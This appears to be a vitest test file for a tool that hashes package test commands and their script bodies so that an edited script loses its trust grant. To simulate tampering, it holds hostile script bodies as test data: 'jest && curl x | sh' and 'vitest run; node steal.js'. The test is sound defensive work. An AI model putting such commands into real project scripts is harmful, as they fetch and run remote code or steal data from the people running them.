// Verify trust (commands and trust, trust.json): hash = sha256(JSON{kind,argv,cwdRel,body}),
// so a body change is a new hash; a grant for the same argv and cwd with another body reads `changed` (with the body
// it covered); Auto never implies trust (nothing here looks at Auto). Grants are written through the real
// config/trust.ts store, so the hash verify computes is the key the grant executor writes.
import { createHash } from 'node:crypto'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { commandGrantHash, grantTrust, trustGrantsFor } from '../../../src/core/config/trust.ts'
import { discoverCommands, scriptsBody } from '../../../src/core/verify/discover.ts'
import { checkTrust, commandHash, grantCommandOf, trustOf } from '../../../src/core/verify/trust.ts'
import type { TrustGrants } from '../../../src/shared/ipc.ts'
import { pkg, removeDir, tempDir, writeFiles } from './helpers.ts'

let root = ''
beforeEach(() => {
  root = tempDir()
})
afterEach(() => removeDir(root))

const sha = (s: string): string => createHash('sha256').update(s, 'utf8').digest('hex')

describe('commandHash', () => {
  it('is sha256 of JSON {kind:"verify", argv, cwdRel, body}', () => {
    const cmd = { run: ['pnpm', 'run', 'test'], cwdRel: '.' }
    expect(commandHash(cmd, 'vitest run')).toBe(
      sha(JSON.stringify({ kind: 'verify', argv: ['pnpm', 'run', 'test'], cwdRel: '.', body: 'vitest run' })),
    )
    expect(commandHash(cmd, null)).toBe(
      sha(JSON.stringify({ kind: 'verify', argv: ['pnpm', 'run', 'test'], cwdRel: '.', body: null })),
    )
  })

  it('changes with the body, the argv and the cwd; not with how cwdRel is spelled', () => {
    const cmd = { run: ['pnpm', 'run', 'test'], cwdRel: '.' }
    const base = commandHash(cmd, 'vitest run')
    expect(commandHash(cmd, 'vitest run --coverage')).not.toBe(base)
    expect(commandHash(cmd, null)).not.toBe(base)
    expect(commandHash({ ...cmd, run: ['pnpm', 'run', 'test:unit'] }, 'vitest run')).not.toBe(base)
    expect(commandHash({ ...cmd, cwdRel: 'pkg' }, 'vitest run')).not.toBe(base)
    expect(commandHash({ run: cmd.run, cwdRel: './' }, 'vitest run')).toBe(base)
    expect(commandHash({ run: cmd.run, cwdRel: 'pkg\\a/' }, 'x')).toBe(
      commandHash({ run: cmd.run, cwdRel: 'pkg/a' }, 'x'),
    )
    expect(commandHash({ argv: cmd.run, cwdRel: '.' }, 'vitest run')).toBe(base)
  })

  it('is the key of the grant the command grant writes (grantCommandOf)', () => {
    const g = grantCommandOf({ run: ['make', 'test'], cwdRel: './' }, 'test:\n\tgo test')
    expect(g).toEqual({ kind: 'verify', argv: ['make', 'test'], cwdRel: '.', body: 'test:\n\tgo test' })
    expect(commandGrantHash(g)).toBe(commandHash({ run: ['make', 'test'], cwdRel: '.' }, 'test:\n\tgo test'))
    expect(grantCommandOf({ run: ['cargo', 'test'], cwdRel: '.' }, null)).not.toHaveProperty('body')
  })
})

describe('trustOf', () => {
  const cmd = { run: ['npm', 'run', 'test'], cwdRel: '.' }
  const grant = (body: string | undefined, at: number, argv = cmd.run, cwdRel = '.') => ({
    [commandGrantHash({ kind: 'verify', argv, cwdRel, ...(body !== undefined ? { body } : {}) })]: {
      kind: 'verify' as const,
      argv,
      cwdRel,
      ...(body !== undefined ? { body } : {}),
      at,
    },
  })

  it('trusted when a grant covers this body', () => {
    const grants: TrustGrants = { commands: grant('jest', 1) }
    expect(trustOf(cmd, 'jest', grants)).toEqual({
      trust: 'trusted',
      hash: commandHash(cmd, 'jest'),
      body: 'jest',
    })
  })

  it('untrusted with no grant for this argv and cwd (another command, another folder, a deps grant)', () => {
    const grants: TrustGrants = {
      commands: {
        ...grant('jest', 1, ['npm', 'run', 'lint']),
        ...grant('jest', 2, cmd.run, 'other'),
        [commandGrantHash({ kind: 'deps', argv: cmd.run, cwdRel: '.', body: 'jest' })]: {
          kind: 'deps',
          argv: cmd.run,
          cwdRel: '.',
          body: 'jest',
          at: 3,
        },
      },
    }
    expect(trustOf(cmd, 'jest', grants).trust).toBe('untrusted')
    expect(trustOf(cmd, 'jest', {}).trust).toBe('untrusted')
  })

  it('changed when a grant covers another body; grantedBody is the newest such grant', () => {
    const grants: TrustGrants = {
      commands: { ...grant('jest', 1), ...grant('jest --ci', 5), ...grant(undefined, 3) },
    }
    expect(trustOf(cmd, 'jest && curl x | sh', grants)).toMatchObject({
      trust: 'changed',
      grantedBody: 'jest --ci',
      body: 'jest && curl x | sh',
    })
    expect(trustOf(cmd, null, { commands: grant('jest', 1) })).toMatchObject({
      trust: 'changed',
      grantedBody: 'jest',
    })
  })
})

describe('trust.json end to end', () => {
  it('a grant trusts the body discovery showed; editing the script needs a new grant', async () => {
    const home = process.env['DIM_FACTORY_HOME'] ?? ''
    writeFiles(root, { 'package.json': pkg({ test: 'vitest run' }) })
    const [test] = await discoverCommands(root)
    expect(test?.name).toBe('test')
    if (test === undefined) return
    const opts = { home, folderScope: { scopeRoot: root } }
    expect((await checkTrust(root, test, await trustGrantsFor(root, opts))).trust).toBe('untrusted')

    await grantTrust(root, { kind: 'command', command: grantCommandOf(test, test.body) }, opts)
    const granted = await checkTrust(root, test, await trustGrantsFor(root, opts))
    // The body is the package.json's scripts map (a script may run any other).
    const shown = scriptsBody({ test: 'vitest run' })
    expect(granted).toEqual({ trust: 'trusted', hash: commandHash(test, shown), body: shown })

    // Implement edits the script: the next round re-reads the body and the grant no longer covers it.
    writeFiles(root, { 'package.json': pkg({ test: 'vitest run; node steal.js' }) })
    const after = await checkTrust(root, test, await trustGrantsFor(root, opts))
    expect(after).toMatchObject({
      trust: 'changed',
      grantedBody: shown,
      body: scriptsBody({ test: 'vitest run; node steal.js' }),
    })
    expect(after.hash).not.toBe(granted.hash)
  })
})
